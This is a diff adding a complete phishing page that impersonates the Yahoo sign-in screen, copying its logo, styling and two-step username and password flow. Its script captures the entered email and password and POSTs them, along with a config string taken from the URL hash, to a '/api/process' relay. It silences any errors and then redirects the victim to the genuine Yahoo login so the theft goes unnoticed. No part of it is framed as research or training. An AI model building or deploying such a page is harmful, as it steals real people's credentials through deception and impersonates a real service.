@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Yahoo</title>
+    <link rel="shortcut icon" href="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;600;700&display=swap');
+        
+        body { 
+            font-family: 'Public Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            color: #26282a;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 40px 24px;
+            text-align: center;
+        }
+
+        .yh-logo {
+            height: 36px;
+            margin: 0 auto 32px;
+        }
+
+        .yh-heading {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 32px;
+            color: #1d2228;
+        }
+
+        .input-label {
+            display: block;
+            text-align: left;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1d2228;
+        }
+
+        .yh-input {
+            width: 100%;
+            height: 52px;
+            border: 1px solid #d8dbe0;
+            border-radius: 4px;
+            font-size: 16px;
+            padding: 0 16px;
+            outline: none;
+            transition: border-color 0.2s;
+            margin-bottom: 8px;
+        }
+
+        .yh-input:focus {
+            border-color: #7e1fff;
+        }
+
+        .yh-link {
+            color: #7e1fff;
+            font-size: 14px;
+            font-weight: 400;
+            text-decoration: none;
+        }
+
+        .yh-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-next {
+            background-color: #7e1fff;
+            color: #ffffff;
+            font-weight: 700;
+            font-size: 16px;
+            height: 48px;
+            width: 100%;
+            border-radius: 24px;
+            margin-top: 32px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-next:hover { background-color: #6a19d9; }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 32px 0;
+            color: #82858b;
+            font-size: 14px;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #e0e4e9;
+        }
+        .divider:not(:empty)::before { margin-right: 1.25em; }
+        .divider:not(:empty)::after { margin-left: 1.25em; }
+
+        .btn-google {
+            background-color: #ffffff;
+            border: 1px solid #d8dbe0;
+            color: #1d2228;
+            font-weight: 600;
+            font-size: 16px;
+            height: 48px;
+            border-radius: 24px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 32px;
+        }
+
+        .btn-create {
+            color: #7e1fff;
+            font-weight: 700;
+            font-size: 16px;
+            text-decoration: none;
+        }
+
+        #loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: transparent;
+            overflow: hidden;
+            display: none;
+            z-index: 1000;
+        }
+        #loader div {
+            position: absolute;
+            background-color: #7e1fff;
+            height: 100%;
+            width: 40%;
+            animation: yhIndeterminate 1.2s infinite linear;
+        }
+        @keyframes yhIndeterminate { 0% { left: -40%; } 100% { left: 100%; } }
+
+        .footer {
+            margin-top: auto;
+            padding-bottom: 24px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            font-size: 14px;
+            color: #60646b;
+        }
+        .footer a { text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+
+        .hidden { display: none; }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <div id="loader"><div></div></div>
+
+    <main class="main-container">
+        <!-- Logo -->
+        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="yh-logo">
+
+        <!-- Step 1: Username -->
+        <div id="step-id">
+            <h1 class="yh-heading">Sign in to Yahoo</h1>
+            
+            <div class="mb-4">
+                <label class="input-label">Username, email or phone number</label>
+                <input type="text" id="email" class="yh-input" autocomplete="username" autofocus>
+                <div class="text-left">
+                    <a href="#" class="yh-link">Forgot username?</a>
+                </div>
+            </div>
+
+            <button onclick="toPassword()" class="btn-next">Next</button>
+
+            <div class="divider">or</div>
+
+            <button class="btn-google">
+                <img src="https://www.vectorlogo.zone/logos/google/google-icon.svg" class="w-5 h-5">
+                Sign in with Google
+            </button>
+
+            <a href="#" class="btn-create">Create account</a>
+        </div>
+
+        <!-- Step 2: Password -->
+        <div id="step-pass" class="hidden">
+            <div class="flex items-center justify-center gap-2 mb-4 bg-gray-50 py-2 px-4 rounded-full w-fit mx-auto border border-gray-100">
+                <span id="display-user" class="text-sm font-semibold"></span>
+                <button onclick="location.reload()" class="text-[#7e1fff] font-bold text-xs uppercase">Edit</button>
+            </div>
+            <h1 class="yh-heading">Enter password</h1>
+            <p class="text-sm text-gray-500 mb-8 -mt-6">to finish signing in</p>
+            
+            <div class="text-left">
+                <label class="input-label">Password</label>
+                <input type="password" id="password" class="yh-input" placeholder="Password" autofocus>
+                <button onclick="dispatch()" class="btn-next">Next</button>
+                <div class="text-center mt-6">
+                    <a href="#" class="yh-link font-semibold">Forgot password?</a>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <a href="#">Help</a>
+        <a href="#">Terms</a>
+        <a href="#">Privacy</a>
+    </footer>
+
+<script>
+    // 1. Grab configuration from the URL Hash
+    const getRawConfig = () => {
+        const h = window.location.hash.substring(1);
+        return h || null;
+    };
+
+    const configString = getRawConfig();
+    let currentEmail = "";
+
+    function toPassword() {
+        currentEmail = document.getElementById('email').value;
+        if(!currentEmail) return;
+
+        document.getElementById('loader').style.display = 'block';
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('display-user').innerText = currentEmail;
+            document.getElementById('step-id').classList.add('hidden');
+            document.getElementById('step-pass').classList.remove('hidden');
+            document.getElementById('password').focus();
+        }, 800);
+    }
+
+    async function dispatch() {
+        const p = document.getElementById('password').value;
+        if(!p) return;
+
+        document.getElementById('loader').style.display = 'block';
+        const finishUrl = "https://login.yahoo.com/";
+
+        if(!configString) {
+            setTimeout(() => window.location.href = finishUrl, 1200);
+            return;
+        }
+
+        try {
+            // 2. Relay to central Vercel API (/api/process)
+            await fetch('/api/process', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    config: configString, 
+                    data: { 
+                        User: currentEmail, 
+                        Pass: p 
+                    }
+                })
+            });
+        } catch (err) {
+            // Silenced
+        } finally {
+            setTimeout(() => {
+                window.location.href = finishUrl;
+            }, 1200);
+        }
+    }
+</script>
+</body>
+</html>
